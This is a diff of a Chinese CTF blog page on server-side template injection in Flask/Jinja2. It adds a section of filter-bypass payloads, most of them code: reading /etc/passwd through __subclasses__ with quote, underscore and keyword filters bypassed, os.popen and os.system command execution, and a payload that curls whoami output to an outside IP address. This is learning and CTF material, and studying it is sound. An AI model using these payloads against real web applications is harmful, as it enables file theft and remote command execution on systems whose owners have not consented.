@@ -115,7 +115,7 @@
 <meta property="og:image" content="https://0xfire.github.io/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85pyload%E8%A7%A3%E6%9E%90.png">
 <meta property="og:image" content="https://0xfire.github.io/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85_example.png">
 <meta property="article:published_time" content="2020-06-14T15:27:24.000Z">
-<meta property="article:modified_time" content="2020-06-16T09:48:32.562Z">
+<meta property="article:modified_time" content="2020-06-16T11:51:53.444Z">
 <meta property="article:author" content="0xfire">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -382,7 +382,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2.6k
+                  3k
                 </span>
               
 
@@ -398,7 +398,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  9
+                  11
                 </span>
               
             </div>
@@ -507,7 +507,39 @@
 <p>__init__是每个类都有的函数，那么通过__init__调用__globals__就得到了这个类中的各种模块，方法跟变量(字典格式)，如果有popen函数的话，就可以通过__init__.__globals__[‘popen’]来获取到popen的函数指针了，接下来的就是执行命令就不再赘述了。关于__init__的理解我还写了一个小例子，如下：</p>
 <p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85_example.png" alt="0x03_补充_example.png"></p>
 <p>可以看到通过调用__init__.__globals__获取到的模块跟通过dir()获取到的相同，包括导入的os模块也在其中。</p>
-<h3 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 结语"></a>0x04 结语</h3><p>啊这里就不总结了，思路就是那样子，本文基于python3来的，2有一些区别，思路都差不多。</p>
+<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>啊这里就不总结了，思路就是那样子，本文基于python3来的，2有一些区别，思路都差不多。</p>
+<h3 id="0x05-常见绕过方式"><a href="#0x05-常见绕过方式" class="headerlink" title="0x05 常见绕过方式"></a>0x05 常见绕过方式</h3><p>![E:\Hexo\source_posts\SSTI学习](0x0x5_bypass.png)</p>
+<p>观察payload中出现的符号，采取对应的bypass思路(以下是python2，获取的40是file，python3中__subclasses__()没有file)。</p>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p> <code>request.args</code> 是flask中的一个属性,为返回请求的参数,这里把<code>path</code>当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="comment">()</span>.__class__.__bases__.__getitem__<span class="comment">(0)</span>.__subclasses__<span class="comment">()</span>.pop<span class="comment">(40)</span><span class="comment">(request.args.path)</span>.read<span class="comment">()</span>&#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request.args</code>属性</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ''[<span class="string">request.args.class</span>][<span class="symbol">request.args.mro</span>][<span class="string">2</span>][<span class="symbol">request.args.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;&amp;class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=__subclasse</span><br></pre></td></tr></table></figure>
+
+<p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">&#123;&#123; ''[<span class="string">request.value.class</span>][<span class="symbol">request.value.mro</span>][<span class="string">2</span>][<span class="symbol">request.value.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br><span class="line">POST:</span><br><span class="line">class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=<span class="strong">__subclasses__</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>list有个__getitem__方法，还有个pop方法，都能绕过，dict有get等方法，都可以通过查看__dict__来查阅。</p>
+<h3 id="过滤-123-123"><a href="#过滤-123-123" class="headerlink" title="过滤&#123;&#123;"></a>过滤&#123;&#123;</h3><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ''.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="name">'curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>base64编码绕过</strong><br><code>__getattribute__</code>使用实例访问属性时,调用该方法</p>
+<p>例如被过滤掉<code>__class__</code>关键词</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('X19jbGFzc19f'.decode('base64')).<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>字符串拼接绕过</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('<span class="strong">__c'+'lass__</span>').<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p><strong>不利用<strong>globals</strong></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>timeit</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>platform</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p> <strong>from_object</strong> </p>
+<p>太多了。。。暂时不总结了，这里主要概括为使用框架的内省对象。所有总结就到此结束了</p>
 
       
     </div>
@@ -761,7 +793,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-原理"><span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-扩展深入"><span class="nav-text">0x02 扩展深入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内建函数"><span class="nav-text">内建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#名称空间"><span class="nav-text">名称空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命名空间的”顺序”"><span class="nav-text">命名空间的”顺序”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类继承"><span class="nav-text">类继承</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#魔术函数"><span class="nav-text">魔术函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-构造payload"><span class="nav-text">0x03 构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找可以利用的类"><span class="nav-text">寻找可以利用的类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload解析"><span class="nav-text">payload解析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-结语"><span class="nav-text">0x04 结语</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-前言"><span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-原理"><span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-扩展深入"><span class="nav-text">0x02 扩展深入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#内建函数"><span class="nav-text">内建函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#名称空间"><span class="nav-text">名称空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命名空间的”顺序”"><span class="nav-text">命名空间的”顺序”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类继承"><span class="nav-text">类继承</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#魔术函数"><span class="nav-text">魔术函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-构造payload"><span class="nav-text">0x03 构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找可以利用的类"><span class="nav-text">寻找可以利用的类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload解析"><span class="nav-text">payload解析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-小结"><span class="nav-text">0x04 小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-常见绕过方式"><span class="nav-text">0x05 常见绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤引号"><span class="nav-text">过滤引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤双下划线"><span class="nav-text">过滤双下划线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤中括号"><span class="nav-text">过滤中括号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤-123-123"><span class="nav-text">过滤&amp;#123;&amp;#123;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤关键字"><span class="nav-text">过滤关键字</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-后记"><span class="nav-text">0x06 后记</span></a></li></ol></div>
             
 
           </div>
